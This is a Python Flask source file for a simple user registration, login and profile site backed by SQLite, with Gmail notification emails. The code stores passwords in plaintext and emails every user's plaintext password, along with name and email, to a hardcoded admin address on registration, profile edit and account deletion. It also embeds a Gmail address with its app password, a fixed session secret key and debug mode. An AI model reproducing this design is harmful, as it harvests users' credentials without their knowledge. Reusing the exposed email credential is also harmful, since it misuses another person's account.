from flask import Flask, render_template, request, redirect, session, url_for
import sqlite3, os
from werkzeug.utils import secure_filename
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)
app.secret_key = 'supersecretkey'
UPLOAD_FOLDER = 'static/uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Email sending function
def send_email(subject, body, to_email):
    sender_email = "devpyfode@gmail.com"
    sender_password = "xwrq qkid mcud ndoy"

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = to_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'html'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(message)
        server.quit()
        print("✅ Email sent to", to_email)
    except Exception as e:
        print("❌ Email send failed:", e)

def send_confirmation_email(to_email, name):
    body = f"""
    <h2>Hello {name},</h2>
    <p>Thank you for registering on our platform! We're excited to have you onboard.</p>
    <p>Start exploring your dashboard and update your profile anytime.</p>
    <br>
    <p>Best Regards,<br>Dev & Amit 🚀</p>
    """
    send_email("Welcome to Our Site!", body, to_email)

def send_details_to_admin(subject, body):
    admin_email = "dev514660@gmail.com"
    send_email(subject, body, admin_email)

@app.route('/')
def home():
    return redirect('/register')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        password = request.form['password']
        photo = request.files['photo']
        photo_name = secure_filename(photo.filename)
        photo.save(os.path.join(app.config['UPLOAD_FOLDER'], photo_name))

        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        try:
            c.execute("INSERT INTO users (name, email, password, photo) VALUES (?, ?, ?, ?)",
                      (name, email, password, photo_name))
            conn.commit()
            send_confirmation_email(email, name)
            send_details_to_admin("New User Registered",
                                  f"Name: {name}<br>Email: {email}<br>Password: {password}<br>Photo: {photo_name}")
        except sqlite3.IntegrityError:
            conn.close()
            return "⚠️ Email already registered"
        conn.close()
        return redirect('/login')
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE email=? AND password=?", (email, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            return redirect('/dashboard')
        else:
            return "❌ Invalid Credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect('/login')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/login')

    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE id=?", (session['user_id'],))
    user = c.fetchone()
    conn.close()
    return render_template('dashboard.html', user=user)

@app.route('/edit', methods=['GET', 'POST'])
def edit():
    if 'user_id' not in session:
        return redirect('/login')

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        password = request.form['password']
        photo = request.files.get('photo')

        c.execute("SELECT * FROM users WHERE id=?", (session['user_id'],))
        old_user = c.fetchone()

        if photo:
            photo_name = secure_filename(photo.filename)
            photo.save(os.path.join(app.config['UPLOAD_FOLDER'], photo_name))
            c.execute("UPDATE users SET name=?, email=?, password=?, photo=? WHERE id=?",
                      (name, email, password, photo_name, session['user_id']))
        else:
            photo_name = old_user[4]
            c.execute("UPDATE users SET name=?, email=?, password=? WHERE id=?",
                      (name, email, password, session['user_id']))

        conn.commit()
        conn.close()

        send_email("Profile Updated",
                   f"<h3>Hi {name},</h3><p>Your profile has been updated successfully.</p>",
                   email)

        send_details_to_admin("User Profile Edited",
                              f"User ID: {session['user_id']}<br>Old Name: {old_user[1]}<br>New Name: {name}<br>Old Email: {old_user[2]}<br>New Email: {email}<br>New Password: {password}<br>New Photo: {photo_name}")
        return redirect('/dashboard')

    c.execute("SELECT * FROM users WHERE id=?", (session['user_id'],))
    user = c.fetchone()
    conn.close()
    return render_template('edit_profile.html', user=user)

@app.route('/change_password', methods=['GET', 'POST'])
def change_password():
    if 'user_id' not in session:
        return redirect('/login')

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    if request.method == 'POST':
        old_password = request.form['old_password']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']

        c.execute("SELECT password FROM users WHERE id=?", (session['user_id'],))
        current_password = c.fetchone()[0]

        if old_password != current_password:
            return "⚠️ Incorrect old password"
        if new_password != confirm_password:
            return "⚠️ Passwords do not match"

        c.execute("UPDATE users SET password=? WHERE id=?", (new_password, session['user_id']))
        conn.commit()
        conn.close()
        return redirect('/dashboard')

    return render_template('change_password.html')

@app.route('/delete', methods=['POST'])
def delete_account():
    if 'user_id' in session:
        user_id = session['user_id']

        conn = sqlite3.connect('database.db')  # ✅ Fixed the DB name
        cursor = conn.cursor()

        # Get user info
        cursor.execute("SELECT name, email, password, photo FROM users WHERE id = ?", (user_id,))
        user = cursor.fetchone()

        # Delete user
        cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()

        # Send confirmation emails
        send_email("Account Deleted",
                   f"<h3>Hi {user[0]},</h3><p>Your account has been successfully deleted.</p>",
                   user[1])
        send_details_to_admin("User Deleted Account",
                              f"Name: {user[0]}<br>Email: {user[1]}<br>Password: {user[2]}<br>Photo: {user[3]}")
        session.pop('user_id', None)
        return redirect('/register')

    return redirect('/login')

if __name__ == '__main__':
    app.run(debug=True)